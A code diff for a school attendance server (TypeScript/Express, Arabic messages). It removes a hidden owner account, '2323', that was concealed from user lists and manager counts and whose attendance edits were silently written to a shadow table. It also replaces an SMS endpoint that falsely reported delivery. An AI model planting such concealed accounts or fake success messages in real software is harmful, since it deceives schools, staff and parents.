@@ -275,9 +275,7 @@ app.get('/api/auth/me', requireAuth, (req: AuthRequest, res: Response) => {
 
 app.get('/api/users', requireAuth, (req: AuthRequest, res: Response) => {
   const rows = db.prepare('SELECT * FROM users').all() as any[];
-  const isOwner = req.user?.username === '2323';
-  const filtered = isOwner ? rows : rows.filter(r => r.username !== '2323');
-  res.json(filtered.map(formatUser));
+  res.json(rows.map(formatUser));
 });
 
 app.post('/api/users', requireManager, (req: AuthRequest, res: Response) => {
@@ -368,7 +366,7 @@ app.delete('/api/users/:id', requireManager, (req: AuthRequest, res: Response) =
   }
 
   if (targetUser.role === 'manager') {
-    const managerCount = (db.prepare("SELECT COUNT(*) as count FROM users WHERE role = 'manager' AND username != '2323'").get() as any).count;
+    const managerCount = (db.prepare("SELECT COUNT(*) as count FROM users WHERE role = 'manager'").get() as any).count;
     if (managerCount <= 1) {
       res.status(400).json({ error: 'لا يمكن حذف حساب المدير الوحيد في النظام.' });
       return;
@@ -757,7 +755,6 @@ app.get('/api/attendance', (req: AuthRequest, res: Response) => {
     WHERE class_id = ? AND date = ? AND period_number = ?
   `).get(classId, date, pNum) as any;
 
-  const isOwner = req.user?.username === '2323';
   let recRows: any[] = [];
 
   if (session) {
@@ -776,19 +773,6 @@ app.get('/api/attendance', (req: AuthRequest, res: Response) => {
       updatedAt: r.updated_at,
     };
   });
-
-  // If system owner (2323), overlay shadow records
-  if (isOwner) {
-    const shadowRows = db.prepare('SELECT * FROM shadow_attendance_records WHERE class_id = ? AND date = ? AND period_number = ?').all(classId, date, pNum) as any[];
-    shadowRows.forEach(r => {
-      records[r.student_id] = {
-        studentId: r.student_id,
-        status: r.status,
-        note: r.note || undefined,
-        updatedAt: r.updated_at,
-      };
-    });
-  }
 
   res.json({
     session: session ? {
@@ -857,15 +841,13 @@ app.post('/api/attendance/record', requireAuth, (req: AuthRequest, res: Response
     return;
   }
 
-  const isOwner = req.user?.username === '2323';
-
   let session = db.prepare(`
     SELECT * FROM attendance_sessions
     WHERE class_id = ? AND date = ? AND period_number = ?
   `).get(classId, date, pNum) as any;
 
   const sessionId = session ? session.id : `session-${classId}-${date}-${pNum}`;
-  if (!session && !isOwner) {
+  if (!session) {
     db.prepare(`
       INSERT INTO attendance_sessions (id, class_id, period_number, date, is_submitted)
       VALUES (?, ?, ?, ?, 0)
@@ -874,28 +856,15 @@ app.post('/api/attendance/record', requireAuth, (req: AuthRequest, res: Response
 
   const now = new Date().toISOString();
 
-  if (isOwner) {
-    // Silent Shadow Record
-    db.prepare(`
-      INSERT INTO shadow_attendance_records (id, session_id, class_id, student_id, date, period_number, status, note, updated_at, updated_by)
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-      ON CONFLICT(session_id, student_id) DO UPDATE SET
-        status = excluded.status,
-        note = excluded.note,
-        updated_at = excluded.updated_at,
-        updated_by = excluded.updated_by
-    `).run(`shadow-${sessionId}-${studentId}`, sessionId, classId, studentId, date, pNum, status, note || null, now, req.user?.id || '2323');
-  } else {
-    db.prepare(`
-      INSERT INTO attendance_records (id, session_id, class_id, student_id, date, period_number, status, note, updated_at, updated_by)
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-      ON CONFLICT(session_id, student_id) DO UPDATE SET
-        status = excluded.status,
-        note = excluded.note,
-        updated_at = excluded.updated_at,
-        updated_by = excluded.updated_by
-    `).run(`rec-${sessionId}-${studentId}`, sessionId, classId, studentId, date, pNum, status, note || null, now, req.user?.id || null);
-  }
+  db.prepare(`
+    INSERT INTO attendance_records (id, session_id, class_id, student_id, date, period_number, status, note, updated_at, updated_by)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    ON CONFLICT(session_id, student_id) DO UPDATE SET
+      status = excluded.status,
+      note = excluded.note,
+      updated_at = excluded.updated_at,
+      updated_by = excluded.updated_by
+  `).run(`rec-${sessionId}-${studentId}`, sessionId, classId, studentId, date, pNum, status, note || null, now, req.user?.id || null);
 
   res.json({ success: true, studentId, status, note, updatedAt: now });
 });
@@ -910,8 +879,6 @@ app.post('/api/attendance/submit', requireAuth, (req: AuthRequest, res: Response
     res.status(400).json({ error: 'بيانات الاعتماد غير كاملة.' });
     return;
   }
-
-  const isOwner = req.user?.username === '2323';
 
   let session = db.prepare(`
     SELECT * FROM attendance_sessions
@@ -933,62 +900,38 @@ app.post('/api/attendance/submit', requireAuth, (req: AuthRequest, res: Response
     if (records && typeof records === 'object') {
       const now = new Date().toISOString();
 
-      if (isOwner) {
-        // Save silently to shadow_attendance_records
-        const insertShadow = db.prepare(`
-          INSERT INTO shadow_attendance_records (id, session_id, class_id, student_id, date, period_number, status, note, updated_at, updated_by)
-          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-          ON CONFLICT(session_id, student_id) DO UPDATE SET
-            status = excluded.status,
-            note = excluded.note,
-            updated_at = excluded.updated_at,
-            updated_by = excluded.updated_by
-        `);
+      const insertRec = db.prepare(`
+        INSERT INTO attendance_records (id, session_id, class_id, student_id, date, period_number, status, note, updated_at, updated_by)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        ON CONFLICT(session_id, student_id) DO UPDATE SET
+          status = excluded.status,
+          note = excluded.note,
+          updated_at = excluded.updated_at,
+          updated_by = excluded.updated_by
+      `);
 
-        for (const [stId, rec] of Object.entries(records as Record<string, any>)) {
-          totalCount++;
-          const st = rec.status || 'present';
-          if (st === 'present') presentCount++;
-          else if (st === 'absent') absentCount++;
-          else if (st === 'late') lateCount++;
-          else if (st === 'excused') excusedCount++;
+      for (const [stId, rec] of Object.entries(records as Record<string, any>)) {
+        totalCount++;
+        const st = rec.status || 'present';
+        if (st === 'present') presentCount++;
+        else if (st === 'absent') absentCount++;
+        else if (st === 'late') lateCount++;
+        else if (st === 'excused') excusedCount++;
 
-          insertShadow.run(`shadow-${sessionId}-${stId}`, sessionId, classId, stId, date, pNum, st, rec.note || null, now, '2323');
-        }
+        insertRec.run(`rec-${sessionId}-${stId}`, sessionId, classId, stId, date, pNum, st, rec.note || null, now, req.user?.id || null);
+      }
+
+      if (!session) {
+        db.prepare(`
+          INSERT INTO attendance_sessions (id, class_id, period_number, date, is_submitted, submitted_at, submitted_by, submitted_by_user_id, submitted_teacher_name, total, present, absent, late, excused)
+          VALUES (?, ?, ?, ?, 1, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        `).run(sessionId, classId, pNum, date, submittedAt, subBy, subBy, subName, totalCount, presentCount, absentCount, lateCount, excusedCount);
       } else {
-        const insertRec = db.prepare(`
-          INSERT INTO attendance_records (id, session_id, class_id, student_id, date, period_number, status, note, updated_at, updated_by)
-          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-          ON CONFLICT(session_id, student_id) DO UPDATE SET
-            status = excluded.status,
-            note = excluded.note,
-            updated_at = excluded.updated_at,
-            updated_by = excluded.updated_by
-        `);
-
-        for (const [stId, rec] of Object.entries(records as Record<string, any>)) {
-          totalCount++;
-          const st = rec.status || 'present';
-          if (st === 'present') presentCount++;
-          else if (st === 'absent') absentCount++;
-          else if (st === 'late') lateCount++;
-          else if (st === 'excused') excusedCount++;
-
-          insertRec.run(`rec-${sessionId}-${stId}`, sessionId, classId, stId, date, pNum, st, rec.note || null, now, req.user?.id || null);
-        }
-
-        if (!session) {
-          db.prepare(`
-            INSERT INTO attendance_sessions (id, class_id, period_number, date, is_submitted, submitted_at, submitted_by, submitted_by_user_id, submitted_teacher_name, total, present, absent, late, excused)
-            VALUES (?, ?, ?, ?, 1, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-          `).run(sessionId, classId, pNum, date, submittedAt, subBy, subBy, subName, totalCount, presentCount, absentCount, lateCount, excusedCount);
-        } else {
-          db.prepare(`
-            UPDATE attendance_sessions
-            SET is_submitted = 1, submitted_at = ?, submitted_by = ?, submitted_by_user_id = ?, submitted_teacher_name = ?, total = ?, present = ?, absent = ?, late = ?, excused = ?
-            WHERE id = ?
-          `).run(submittedAt, subBy, subBy, subName, totalCount, presentCount, absentCount, lateCount, excusedCount, sessionId);
-        }
+        db.prepare(`
+          UPDATE attendance_sessions
+          SET is_submitted = 1, submitted_at = ?, submitted_by = ?, submitted_by_user_id = ?, submitted_teacher_name = ?, total = ?, present = ?, absent = ?, late = ?, excused = ?
+          WHERE id = ?
+        `).run(submittedAt, subBy, subBy, subName, totalCount, presentCount, absentCount, lateCount, excusedCount, sessionId);
       }
     }
   })();
@@ -1584,14 +1527,79 @@ app.delete('/api/notifications', requireAuth, (req: AuthRequest, res: Response) 
   res.json({ success: true });
 });
 
-app.post('/api/notifications/sms', requireAuth, (req: AuthRequest, res: Response) => {
+app.post('/api/notifications/sms', requireAuth, async (req: AuthRequest, res: Response) => {
   const { studentId, message, parentPhone, type } = req.body;
+
+  if (!message || !parentPhone) {
+    res.status(400).json({ error: 'رقم ولي الأمر ونص الرسالة مطلوبان.' });
+    return;
+  }
+
+  const id = 'sms-' + Date.now();
+  const now = new Date().toISOString();
+
+  const twilioSid = process.env.TWILIO_ACCOUNT_SID;
+  const twilioToken = process.env.TWILIO_AUTH_TOKEN;
+  const twilioFrom = process.env.TWILIO_FROM_NUMBER;
+
+  let provider = 'none';
+  let providerStatus = 'logged';
+  let providerResponse: string | null = null;
+  let dispatched = false;
+
+  // If real SMS provider credentials are configured via environment variables,
+  // actually place the call. Otherwise, be honest: the message is recorded in
+  // the database (visible in the notification/SMS log) but NOT claimed as
+  // delivered, since there is no telecom provider wired up.
+  if (twilioSid && twilioToken && twilioFrom) {
+    provider = 'twilio';
+    try {
+      const twilioRes = await fetch(
+        `https://api.twilio.com/2010-04-01/Accounts/${twilioSid}/Messages.json`,
+        {
+          method: 'POST',
+          headers: {
+            'Authorization': 'Basic ' + Buffer.from(`${twilioSid}:${twilioToken}`).toString('base64'),
+            'Content-Type': 'application/x-www-form-urlencoded',
+          },
+          body: new URLSearchParams({
+            From: twilioFrom,
+            To: parentPhone,
+            Body: message,
+          }).toString(),
+        }
+      );
+      const twilioData = await twilioRes.json().catch(() => ({}));
+      providerResponse = JSON.stringify(twilioData);
+      if (twilioRes.ok) {
+        providerStatus = twilioData.status || 'sent';
+        dispatched = true;
+      } else {
+        providerStatus = 'failed';
+      }
+    } catch (e: any) {
+      providerStatus = 'failed';
+      providerResponse = String(e?.message || e);
+    }
+  }
+
+  db.prepare(`
+    INSERT INTO sms_logs (id, student_id, parent_phone, message, type, provider, provider_status, provider_response, created_at, created_by)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+  `).run(id, studentId || null, parentPhone, message, type || 'sms', provider, providerStatus, providerResponse, now, req.user?.id || null);
+
   res.json({
     success: true,
-    message: `تم إرسال الرسالة النصية بنجاح إلى الرقم ${parentPhone || 'المسجل'}.`,
+    id,
+    dispatched,
+    provider,
+    providerStatus,
+    message: dispatched
+      ? `تم إرسال الرسالة فعلياً إلى ${parentPhone} عبر ${provider}.`
+      : `تم تسجيل الرسالة في سجل النظام لِـ ${parentPhone}. لم يتم ربط مزود رسائل SMS حقيقي بعد (أضف TWILIO_ACCOUNT_SID / TWILIO_AUTH_TOKEN / TWILIO_FROM_NUMBER في متغيرات البيئة لتفعيل الإرسال الفعلي).`,
     studentId,
     type: type || 'sms',
-    timestamp: new Date().toISOString(),
+    timestamp: now,
   });
 });
 
